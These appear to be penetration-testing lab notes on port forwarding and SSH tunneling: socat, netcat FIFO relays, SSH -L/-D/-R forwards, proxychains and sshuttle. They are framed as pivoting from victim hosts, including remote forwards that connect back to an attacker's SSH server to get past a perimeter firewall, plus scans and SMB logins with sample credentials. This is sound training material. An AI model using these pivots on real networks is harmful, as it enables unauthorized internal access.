# Port Redirection and SSH Tunneling



## Port Forwarding with Socat
Socat is a general-purpose networking tool that can set up a simple port forward in a single command.


`-ddd`: verbose
`fork`: fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection

```
# listen 2345 and forward to port 5432
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# listen 2222 and forward to 22
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```




`socat` is not the only way to create port forwards on *NIX hosts. There are several alternatives, of note:







## rinetd
Is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.








## nc
We can combine Netcat and a FIFO named pipe file to create a port forward.
```
#!/usr/bin/env bash

set -e

if [ $# != 3 ]; then

        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2
        exit 1
fi

FRONTPORT=$1
BACKHOST=$2
BACKPORT=$3

FIFO=/tmp/backpipe

trap 'echo "trapped."; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15

mkfifo $FIFO
while true; do
        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO
done
rm -f $FIFO
```







## iptables
If we have root privileges, we could use `iptables` to create port forwards.
The specific `iptables` port forwarding setup for a given host will likely depend on the configuration already in place.
To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to `/proc/sys/net/ipv4/conf/[interface]/forwarding` (if it's not already configured to allow it).


































## SSH Tunneling

Tunneling describes the act of encapsulating one kind of data stream within another.

The SSH protocol is primarily a tunneling protocol, so it's possible to pass almost any kind of data through an SSH connection. For that reason, tunneling capabilities are built into most SSH tools.




### Local Port Forwarding
Limitation: we can only connect to one socket per SSH connection. 

A local port forward can be set up using OpenSSH's `-L` option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument
- The first socket is the listening socket that will be bound to the SSH client machine.
- The second socket is where we want to forward the packets to.
- The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.


`-N`: prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.

`-L`: set up local port forwarding



If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the `-v` flag to ssh in order to receive debug output.

```
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
(We're listening on port 4455 because we don't have the permissions to listen on any port below 1024.)




Now connecting to port `4455` on the first machine will now be just like connecting directly to port 445 on the second one. For example:\
```
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```








### Dynamic Port Forwarding

From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.


SSH dynamic port forwarding works because the listening port that the SSH client creates is a SOCKS proxy server port.

SOCKS is a proxying protocol. Much like a postal service, a SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed.


Packets can be sent to a single listening SOCKS port on the SSH client machine.
These will be pushed through the SSH connection, then forwarded to anywhere the SSH server machine can route.

The only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software. In some cases, software is not SOCKS-compatible by default.


`proxychains` is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.


How `proxychains` works:
it uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server.
This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations.
It won't work on statically-linked binaries.


Proxychains uses a configuration file for almost everything, stored by default at `/etc/proxychains4.conf`.
We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy (rather than any other kind of proxy).
By default, proxies are defined at the end of the file.
We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on.
Example: `socks5 192.168.50.63 9999`

Although we specify socks5 in this example, it could also be socks4, since SSH supports both.
SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS.
Some SOCKS proxies will only support the SOCKS4 protocol.

Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.


Note: by default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

```
cat /etc/proxychains4.conf
...
# DEFAULT
tcp_read_time_out 15000
tcp_connect_time_out 8000
...
```


Example: VICTIM 3 is only accesible from VICTIM 2

1. On VICTIM 1:
```
ssh -N -D 0.0.0.0:[PORT] database_admin@[VICTIM 2]
```

2. Add `socks5 [VICTIM 2] [PORT]` to /etc/proxychains4.conf

3. From ATTACKER machine:
```
proxychains smbclient -L //[VICTIM 3]/ -U hr_admin --password=Welcome1234

proxychains nmap -vvv -sT --top-ports=20 -Pn [VICTIM 3]
```












### SSH Remote Port Forwarding
- <https://man.openbsd.org/ssh#R>

Inbound traffic is often controlled much more aggressively than outbound traffic.

In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.



1. On ATTACKER MACHINE enable the SSH server on our Kali machine. OpenSSH server is preinstalled, all we need to do is start it
```
sudo systemctl start ssh

# check that the SSH port is open as we expected using ss
sudo ss -ntplu
```

In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting `PasswordAuthentication` to yes in `/etc/ssh/sshd_config`



2. On VICTIM 1

The SSH remote port forward option is `-R`, and has a very similar syntax to the local port forward option.
It also takes two socket pairs as the argument:
- the listening socket is defined first
- the forwarding socket is second

In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).


```
python3 -c 'import pty; pty.spawn("/bin/bash")'

ssh -N -R [ATTACKER MACHINE loopback]:[PORT]:[VICTIM 3]:5432 kali@[ATTACKER MACHINE]
# Example
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

3.
```
psql -h 127.0.0.1 -p 2345 -U postgres
```

We're now interacting with the PostgreSQL instance running on VICTIM 2 through our SSH remote port forward by connecting to port 2345 on our own ATTACKER MACHINE.

In this section, we created an SSH remote port forward to allow us to connect to an internal database server from our Kali machine. We did this while traversing a perimeter firewall, which would otherwise block inbound connections.











### SSH Remote Dynamic Port Forwarding

Creates a dynamic port forward in the remote configuration.
The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.


Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6

Despite this, only the OpenSSH client needs to be version 7.6 or above to use it. The server version doesn't matter.




1. From VICTIM 1

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

# bind the SOCKS proxy to [PORT] on the loopback interface of our Kali machine
ssh -N -R [PORT] kali@[ATTACKER MACHINE]
```



2. As in classic dynamic port forwarding example, use `proxychains` to tunnel traffic over this SOCKS proxy port. Edit the configuration file at `/etc/proxychains4.conf` on our Kali machine to reflect our new local SOCKS proxy port. Add `socks5 127.0.0.1 [PORT]`.

Then we can run the commands:
```

proxychains nmap -vvv -sT --top-ports=20 -Pn -n [VICTIM 3]

```



















## sshuttle
- <https://github.com/sshuttle/sshuttle>

Turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel.


Requires root privileges on the SSH client and Python3 on the SSH server.


1. On VICTIM 1
```
socat TCP-LISTEN:2222,fork TCP:[VICTIM 2]:22
```




2. On ATTACKER MACHINE
Next, we can run `sshuttle`, specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24).
```

sshuttle -r [USER]@[VICTIM 1]:2222 [SUBNET 1] [SUBNET 2]

# Example
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

```





3. Also on ATTACKER MACHINE
```
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```




















